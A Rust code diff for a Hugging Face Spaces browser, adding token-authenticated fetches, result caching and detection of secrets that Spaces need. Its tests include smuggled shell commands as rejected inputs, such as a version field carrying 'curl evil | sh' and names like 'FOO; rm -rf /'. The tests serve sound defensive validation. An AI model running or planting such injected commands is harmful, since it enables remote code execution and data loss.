@@ -2,13 +2,29 @@
 //! compatibility verdict for this machine. Verdicts are honest guesses from
 //! metadata; the store never claims more than "maybe" without a real run.
 
+use std::collections::{BTreeSet, HashMap};
+use std::sync::atomic::Ordering;
+use std::sync::Mutex;
+use std::time::{Duration, Instant};
+
 use regex::Regex;
 use serde::{Deserialize, Serialize};
 use tokio::task::JoinSet;
 
 use crate::error::{Error, Result};
+use crate::state::AppState;
 
 const HF: &str = "https://huggingface.co/api";
+const HF_SITE: &str = "https://huggingface.co";
+
+/// A cached Browse search result stays fresh for this long before a search
+/// re-fetches its detail and secrets (#67).
+const CACHE_TTL: Duration = Duration::from_secs(600);
+
+/// Space source files are grepped for env var names, never executed; a
+/// generous cap keeps a single hostile Space from turning a search into a
+/// multi-megabyte download (#57).
+const MAX_SOURCE_BYTES: usize = 256 * 1024;
 
 #[derive(Debug, Clone, Copy, Serialize, PartialEq, Eq)]
 #[serde(rename_all = "lowercase")]
@@ -34,6 +50,10 @@ pub struct SpaceSummary {
     pub emoji: Option<String>,
     pub compat: Compat,
     pub compat_reason: Option<String>,
+    /// Env var names the Space's source reads that are not part of the
+    /// container's default environment; the user must supply them (#57).
+    #[serde(default)]
+    pub secrets: Vec<String>,
 }
 
 impl SpaceSummary {
@@ -159,53 +179,122 @@ struct RawSibling {
 
 // ---- Spaces ---------------------------------------------------------------
 
+/// Cached summaries cut repeat detail + secrets fetches for Spaces the Browse
+/// tab has already scored this session (#67); a request superseded mid-flight
+/// by a newer search aborts instead of finishing its detail fan-out.
 pub async fn search_spaces(
-    http: &reqwest::Client,
+    state: &AppState,
     query: &str,
     limit: usize,
-    has_gpu: bool,
 ) -> Result<Vec<SpaceSummary>> {
     let limit = limit.clamp(1, 60);
+    let http = state.http.clone();
+    let token = state.hf_token();
+    let has_gpu = state.has_gpu();
+
     let mut url = format!("{HF}/spaces?limit={limit}&sort=likes&direction=-1&full=true");
     if !query.trim().is_empty() {
         url.push_str(&format!("&search={}", urlencode(query.trim())));
     }
-    let raw: Vec<RawSpace> = get(http, &url).await?;
+    let raw: Vec<RawSpace> = get(&http, &url, token.as_deref()).await?;
 
-    // Hardware tier only comes from the detail endpoint; fetch them concurrently.
-    let mut set = JoinSet::new();
-    for (i, s) in raw.iter().enumerate() {
-        let http = http.clone();
-        let id = s.id.clone();
-        set.spawn(async move {
-            let rt = get::<RawSpace>(&http, &format!("{HF}/spaces/{id}"))
-                .await
-                .ok()
-                .and_then(|d| d.runtime);
-            (i, rt)
-        });
-    }
-    let mut runtimes: Vec<Option<RawRuntime>> = vec![None; raw.len()];
-    while let Some(Ok((i, rt))) = set.join_next().await {
-        runtimes[i] = rt;
+    let my_gen = state.search_generation.fetch_add(1, Ordering::SeqCst) + 1;
+
+    let mut results: Vec<Option<SpaceSummary>> = vec![None; raw.len()];
+    let mut pending: Vec<(usize, RawSpace)> = Vec::new();
+    for (i, s) in raw.into_iter().enumerate() {
+        match cache_get(&state.space_cache, &s.id) {
+            Some(summary) => results[i] = Some(summary),
+            None => pending.push((i, s)),
+        }
     }
 
-    Ok(raw
-        .into_iter()
-        .zip(runtimes)
-        .map(|(s, rt)| summarize_space(s, rt, has_gpu))
-        .collect())
+    if !pending.is_empty() {
+        // Hardware tier and secrets both need the detail endpoint / source
+        // text; fetch them concurrently, one task per Space still uncached.
+        let mut set = JoinSet::new();
+        for (i, s) in pending {
+            let http = http.clone();
+            let token = token.clone();
+            let app_file_hint = s
+                .card
+                .as_ref()
+                .and_then(|c| c.app_file.clone())
+                .filter(|f| safe_app_file(f))
+                .unwrap_or_else(|| "app.py".to_string());
+            set.spawn(async move {
+                let detail =
+                    get::<RawSpace>(&http, &format!("{HF}/spaces/{}", s.id), token.as_deref())
+                        .await;
+                let detail_ok = detail.is_ok();
+                let rt = detail.ok().and_then(|d| d.runtime);
+                let secrets = detect_secrets(&http, token.as_deref(), &s.id, &app_file_hint).await;
+                (i, s, rt, detail_ok, secrets)
+            });
+        }
+        while let Some(joined) = set.join_next().await {
+            if state.search_generation.load(Ordering::SeqCst) != my_gen {
+                // A newer search has started; stop spending calls on this one.
+                set.abort_all();
+                break;
+            }
+            if let Ok((i, s, rt, detail_ok, secrets)) = joined {
+                let id = s.id.clone();
+                let summary = summarize_space(s, rt, has_gpu, detail_ok, secrets);
+                if detail_ok {
+                    cache_put(&state.space_cache, id, summary.clone());
+                }
+                results[i] = Some(summary);
+            }
+        }
+    }
+
+    Ok(results.into_iter().flatten().collect())
 }
 
-/// Details for one Space (used at launch time).
-pub async fn space(http: &reqwest::Client, id: &str, has_gpu: bool) -> Result<SpaceSummary> {
+/// Details for one Space (used at launch time); always fetched live, never
+/// from the Browse cache, so the compat gate is checked fresh before a run.
+pub async fn space(state: &AppState, id: &str) -> Result<SpaceSummary> {
     validate_repo(id)?;
-    let d: RawSpace = get(http, &format!("{HF}/spaces/{id}")).await?;
+    let token = state.hf_token();
+    let d: RawSpace = get(&state.http, &format!("{HF}/spaces/{id}"), token.as_deref()).await?;
     let rt = d.runtime.clone();
-    Ok(summarize_space(d, rt, has_gpu))
+    let app_file_hint = d
+        .card
+        .as_ref()
+        .and_then(|c| c.app_file.clone())
+        .filter(|f| safe_app_file(f))
+        .unwrap_or_else(|| "app.py".to_string());
+    let secrets = detect_secrets(&state.http, token.as_deref(), id, &app_file_hint).await;
+    Ok(summarize_space(d, rt, state.has_gpu(), true, secrets))
 }
 
-fn summarize_space(s: RawSpace, runtime: Option<RawRuntime>, has_gpu: bool) -> SpaceSummary {
+fn cache_get(
+    cache: &Mutex<HashMap<String, (SpaceSummary, Instant)>>,
+    id: &str,
+) -> Option<SpaceSummary> {
+    let map = cache.lock().ok()?;
+    let (summary, at) = map.get(id)?;
+    (at.elapsed() < CACHE_TTL).then(|| summary.clone())
+}
+
+fn cache_put(
+    cache: &Mutex<HashMap<String, (SpaceSummary, Instant)>>,
+    id: String,
+    summary: SpaceSummary,
+) {
+    if let Ok(mut map) = cache.lock() {
+        map.insert(id, (summary, Instant::now()));
+    }
+}
+
+fn summarize_space(
+    s: RawSpace,
+    runtime: Option<RawRuntime>,
+    has_gpu: bool,
+    detail_ok: bool,
+    secrets: Vec<String>,
+) -> SpaceSummary {
     let (author, name) = split_repo(&s.id);
     let author = s.author.unwrap_or(author);
     let card = s.card.unwrap_or_default();
@@ -221,12 +310,21 @@ fn summarize_space(s: RawSpace, runtime: Option<RawRuntime>, has_gpu: bool) -> S
     let sdk_version = card.sdk_version.filter(|v| safe_sdk_version(v));
     let runtime = runtime.unwrap_or_default();
     let hardware = runtime.hardware.and_then(|h| h.requested.or(h.current));
-    let (compat, reason) = space_compat(
+    let (mut compat, mut reason) = space_compat(
         sdk.as_deref(),
         runtime.stage.as_deref(),
         hardware.as_deref(),
         has_gpu,
     );
+    // A failed detail fetch (429, timeout) must never read as Ready: the
+    // hardware tier and stage above are simply unknown, not confirmed CPU (#72).
+    if !detail_ok && compat != Compat::Incompatible {
+        compat = Compat::Maybe;
+        reason = Some("could not read hardware tier".into());
+    } else if !secrets.is_empty() && compat == Compat::Ready {
+        compat = Compat::Maybe;
+        reason = Some(format!("Needs secrets: {}", secrets.join(", ")));
+    }
     SpaceSummary {
         id: s.id,
         author,
@@ -241,6 +339,7 @@ fn summarize_space(s: RawSpace, runtime: Option<RawRuntime>, has_gpu: bool) -> S
         emoji: card.emoji,
         compat,
         compat_reason: reason,
+        secrets,
     }
 }
 
@@ -306,7 +405,7 @@ fn space_compat(
 // ---- Models ---------------------------------------------------------------
 
 pub async fn search_models(
-    http: &reqwest::Client,
+    state: &AppState,
     query: &str,
     limit: usize,
 ) -> Result<Vec<ModelSummary>> {
@@ -315,7 +414,8 @@ pub async fn search_models(
     if !query.trim().is_empty() {
         url.push_str(&format!("&search={}", urlencode(query.trim())));
     }
-    let raw: Vec<RawModel> = get(http, &url).await?;
+    let token = state.hf_token();
+    let raw: Vec<RawModel> = get(&state.http, &url, token.as_deref()).await?;
     Ok(raw.into_iter().map(summarize_model).collect())
 }
 
@@ -349,13 +449,16 @@ fn summarize_model(m: RawModel) -> ModelSummary {
 
 /// GGUF files in a repo, smallest first, with a fit verdict against `budget_mb`,
 /// the accelerator's effective memory (`RuntimeStatus::effective_memory_mb`).
-pub async fn model_files(
-    http: &reqwest::Client,
-    repo: &str,
-    budget_mb: Option<u64>,
-) -> Result<Vec<GgufFile>> {
+pub async fn model_files(state: &AppState, repo: &str) -> Result<Vec<GgufFile>> {
     validate_repo(repo)?;
-    let m: RawModel = get(http, &format!("{HF}/models/{repo}?blobs=true")).await?;
+    let budget_mb = state.memory_budget_mb();
+    let token = state.hf_token();
+    let m: RawModel = get(
+        &state.http,
+        &format!("{HF}/models/{repo}?blobs=true"),
+        token.as_deref(),
+    )
+    .await?;
     let quant_re = Regex::new(r"(?i)[-_.]((?:I?Q\d[A-Z0-9_]*)|BF16|F16|F32|FP16)\.gguf$").unwrap();
     let shard_re = Regex::new(r"-\d{5}-of-\d{5}\.gguf$").unwrap();
     let mut files: Vec<GgufFile> = m
@@ -410,12 +513,125 @@ fn fit(size: u64, budget_mb: Option<u64>) -> &'static str {
 
 // ---- helpers --------------------------------------------------------------
 
-async fn get<T: for<'de> Deserialize<'de>>(http: &reqwest::Client, url: &str) -> Result<T> {
-    let resp = http.get(url).send().await?;
+async fn get<T: for<'de> Deserialize<'de>>(
+    http: &reqwest::Client,
+    url: &str,
+    token: Option<&str>,
+) -> Result<T> {
+    let mut req = http.get(url);
+    if let Some(t) = token {
+        req = req.header("Authorization", format!("Bearer {t}"));
+    }
+    let resp = req.send().await?;
     if !resp.status().is_success() {
         return Err(Error::Hf(format!("{} -> {}", url, resp.status())));
     }
     Ok(resp.json::<T>().await?)
+}
+
+/// Fetch one Space source file, bounded to `MAX_SOURCE_BYTES`; a missing file,
+/// a private repo without access, or any other failure is just "nothing found",
+/// never an error, since this is a best-effort heuristic on top of the compat
+/// verdict, not a requirement to launch.
+async fn fetch_raw_bounded(
+    http: &reqwest::Client,
+    token: Option<&str>,
+    id: &str,
+    file: &str,
+) -> Option<String> {
+    let url = format!("{HF_SITE}/spaces/{id}/raw/main/{file}");
+    let mut req = http.get(&url);
+    if let Some(t) = token {
+        req = req.header("Authorization", format!("Bearer {t}"));
+    }
+    let resp = req.send().await.ok()?;
+    if !resp.status().is_success() {
+        return None;
+    }
+    if let Some(len) = resp.content_length() {
+        if len > MAX_SOURCE_BYTES as u64 {
+            return None;
+        }
+    }
+    let bytes = resp.bytes().await.ok()?;
+    let bytes = if bytes.len() > MAX_SOURCE_BYTES {
+        &bytes[..MAX_SOURCE_BYTES]
+    } else {
+        &bytes[..]
+    };
+    Some(String::from_utf8_lossy(bytes).into_owned())
+}
+
+/// Env var names a Space's entry point (and `app.py`, if different) reads
+/// that are not part of the container's default environment (#57).
+async fn detect_secrets(
+    http: &reqwest::Client,
+    token: Option<&str>,
+    id: &str,
+    app_file: &str,
+) -> Vec<String> {
+    let mut text = String::new();
+    if let Some(t) = fetch_raw_bounded(http, token, id, app_file).await {
+        text.push_str(&t);
+    }
+    if app_file != "app.py" {
+        if let Some(t) = fetch_raw_bounded(http, token, id, "app.py").await {
+            text.push('\n');
+            text.push_str(&t);
+        }
+    }
+    if text.is_empty() {
+        return Vec::new();
+    }
+    extract_secret_names(&text)
+}
+
+fn extract_secret_names(text: &str) -> Vec<String> {
+    let patterns = [
+        Regex::new(r#"os\.environ\[\s*['"]([A-Za-z_][A-Za-z0-9_]*)['"]\s*\]"#).unwrap(),
+        Regex::new(r#"os\.environ\.get\(\s*['"]([A-Za-z_][A-Za-z0-9_]*)['"]"#).unwrap(),
+        Regex::new(r#"os\.getenv\(\s*['"]([A-Za-z_][A-Za-z0-9_]*)['"]"#).unwrap(),
+    ];
+    let mut names = BTreeSet::new();
+    for re in &patterns {
+        for cap in re.captures_iter(text) {
+            if let Some(m) = cap.get(1) {
+                let name = m.as_str();
+                if valid_env_name(name) && !is_default_env(name) {
+                    names.insert(name.to_string());
+                }
+            }
+        }
+    }
+    names.into_iter().collect()
+}
+
+/// Env var names for a Space's default container (Docker + Gradio runtime, plus
+/// `HF_TOKEN`, which is handled separately by the Setup token, #60) never count
+/// as secrets the user must supply.
+fn is_default_env(name: &str) -> bool {
+    matches!(
+        name,
+        "PORT" | "HF_HOME" | "SYSTEM" | "HF_TOKEN" | "PATH" | "HOME"
+    ) || name.starts_with("HF_HUB_")
+        || name.starts_with("GRADIO_")
+        || name.starts_with("SPACE_")
+        || name.starts_with("CUDA_")
+        || name.starts_with("PYTHON")
+}
+
+/// A name safe to splice as the identifier in `-e NAME=value` (the value
+/// itself still goes through `wsl::quote`). Space source is hostile input;
+/// this is deliberately case-insensitive (`tryon_url`, not just `TRYON_URL`)
+/// because that is what real Space code uses, but still rejects anything with
+/// shell metacharacters.
+pub fn valid_env_name(name: &str) -> bool {
+    let mut chars = name.chars();
+    match chars.next() {
+        Some(c) if c.is_ascii_alphabetic() || c == '_' => {}
+        _ => return false,
+    }
+    chars.all(|c| c.is_ascii_alphanumeric() || c == '_')
 }
 
 /// Card fields end up in a shell command (`python {app_file}`) and a Dockerfile
@@ -528,7 +744,7 @@ mod tests {
     fn cpu_tiers_and_unknown_tiers_do_not_want_the_gpu() {
         let mk = |hw: Option<&str>| {
             let raw: RawSpace = serde_json::from_str(r#"{"id":"a/b","sdk":"gradio"}"#).unwrap();
-            let mut s = summarize_space(raw, None, true);
+            let mut s = summarize_space(raw, None, true, true, vec![]);
             s.hardware = hw.map(str::to_string);
             s
         };
@@ -559,7 +775,7 @@ mod tests {
                 "sdk_version":"5.0.0\" && curl evil | sh && echo \""}}"#,
         )
         .unwrap();
-        let s = summarize_space(raw, None, true);
+        let s = summarize_space(raw, None, true, true, vec![]);
         assert_eq!(s.app_file, "app.py");
         assert_eq!(s.sdk_version, None);
 
@@ -567,7 +783,7 @@ mod tests {
             r#"{"id":"a/b","sdk":"gradio","cardData":{"app_file":"demo_v2.py","sdk_version":"4.44.1"}}"#,
         )
         .unwrap();
-        let s = summarize_space(raw, None, true);
+        let s = summarize_space(raw, None, true, true, vec![]);
         assert_eq!(s.app_file, "demo_v2.py");
 
         // facebook/MusicGen keeps its entry point in a subdirectory (#46).
@@ -582,7 +798,11 @@ mod tests {
                 r#"{{"id":"a/b","sdk":"gradio","cardData":{{"app_file":"{given}"}}}}"#
             ))
             .unwrap();
-            assert_eq!(summarize_space(raw, None, true).app_file, want, "{given}");
+            assert_eq!(
+                summarize_space(raw, None, true, true, vec![]).app_file,
+                want,
+                "{given}"
+            );
         }
         assert_eq!(s.sdk_version.as_deref(), Some("4.44.1"));
 
@@ -599,5 +819,70 @@ mod tests {
         assert!(validate_repo("Qwen/Qwen3-8B-GGUF").is_ok());
         assert!(validate_repo("../etc").is_err());
         assert!(validate_repo("a/b/c").is_err());
+    }
+
+    /// A failed detail fetch (429, timeout) must not make the card lie with
+    /// Ready; hardware stays unknown, not confirmed CPU-only (#72).
+    #[test]
+    fn failed_detail_fetch_downgrades_to_maybe_and_keeps_hardware_none() {
+        let raw: RawSpace = serde_json::from_str(r#"{"id":"a/b","sdk":"gradio"}"#).unwrap();
+        let s = summarize_space(raw, None, true, false, vec![]);
+        assert_eq!(s.compat, Compat::Maybe);
+        assert_eq!(
+            s.compat_reason.as_deref(),
+            Some("could not read hardware tier")
+        );
+        assert_eq!(s.hardware, None);
+        assert!(
+            !s.wants_gpu(),
+            "a failed fetch must not change wants_gpu semantics"
+        );
+    }
+
+    /// Detail fetch failure never gets confused with a legitimately
+    /// incompatible Space (static SDK is decided before the detail call).
+    #[test]
+    fn failed_detail_fetch_does_not_override_incompatible() {
+        let raw: RawSpace = serde_json::from_str(r#"{"id":"a/b","sdk":"static"}"#).unwrap();
+        let s = summarize_space(raw, None, true, false, vec![]);
+        assert_eq!(s.compat, Compat::Incompatible);
+    }
+
+    /// A Space that reads secrets HF metadata never mentions downgrades a
+    /// Ready card to Maybe and lists what it needs (#57).
+    #[test]
+    fn needed_secrets_downgrade_ready_to_maybe() {
+        let raw: RawSpace =
+            serde_json::from_str(r#"{"id":"a/b","sdk":"gradio","runtime":{"stage":"RUNNING","hardware":{"current":"cpu-basic"}}}"#)
+                .unwrap();
+        let s = summarize_space(raw, None, false, true, vec!["tryon_url".into()]);
+        assert_eq!(s.compat, Compat::Maybe);
+        assert_eq!(s.compat_reason.as_deref(), Some("Needs secrets: tryon_url"));
+        assert_eq!(s.secrets, vec!["tryon_url".to_string()]);
+    }
+
+    #[test]
+    fn extracts_and_filters_env_names() {
+        let src = r#"
+            url = "http://" + os.environ['tryon_url'] + "Submit"
+            key = os.environ.get("API_KEY")
+            port = os.getenv("PORT")
+            name = os.environ["GRADIO_SERVER_NAME"]
+            tok = os.environ["HF_TOKEN"]
+        "#;
+        assert_eq!(
+            extract_secret_names(src),
+            vec!["API_KEY".to_string(), "tryon_url".to_string()]
+        );
+    }
+
+    #[test]
+    fn env_name_validation_rejects_shell_metacharacters() {
+        assert!(valid_env_name("FOO_BAR"));
+        assert!(valid_env_name("tryon_url"));
+        assert!(!valid_env_name(""));
+        assert!(!valid_env_name("FOO; rm -rf /"));
+        assert!(!valid_env_name("$(id)"));
+        assert!(!valid_env_name("1FOO"));
     }
 }
